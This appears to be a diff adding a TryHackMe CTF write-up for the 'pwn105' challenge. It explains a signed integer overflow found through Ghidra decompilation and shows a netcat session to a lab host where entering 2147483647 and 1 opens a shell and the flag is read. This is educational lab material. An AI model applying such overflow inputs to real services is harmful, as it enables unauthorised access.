@@ -8,6 +8,8 @@ categories: [Pwn 101]
 tags: [binary exploitation, Tryhackme ]
 ---
 
+Let's download the binary and decompile it with ghidra. In `main()` we have `local_14 = local_18 + local_1c;`. The code checks if `local_14 < 0` the it pops a shell
+
 ```c
 void main(void){
   long in_FS_OFFSET;
@@ -45,4 +47,43 @@ void main(void){
   }
   return;
 }
+```
+
+Basically `local_14` is the value of the added numbers and so we need to make sure they return a value that is less than 0
+
+> In C, the `int` data type is commonly used for representing integers. The `int` type has a finite range, typically from INT_MIN to INT_MAX. If the result of an addition, subtraction, multiplication, or any other operation exceeds this range, integer overflow occurs.
+
+We need to perform a simple `int` overflow. we know the `int` range is `-2147483647` to `2147483647`. so if we add a value to the highest `int` the sum will go to the opposite side and become a negative.
+
+```shell
+2147483647 = 01111111111111111111111111111111
+
+01111111111111111111111111111111 + 1 = 10000000000000000000000000000000
+```
+
+Let's try that and cat the flag
+
+```shell
+pl4int3xt@archlinux ~/D/p/pwn105> nc 10.10.122.55 9005
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+-------=[ BAD INTEGERS ]=-------
+|-< Enter two numbers to add >-|
+
+]>> 2147483647
+]>> 1
+
+[*] C: -2147483648
+[*] Popped Shell
+[*] Switching to interactive mode
+ls
+flag.txt
+pwn105
+pwn105.c
+cat flag.txt
+THM{REDACTED ..}
 ```
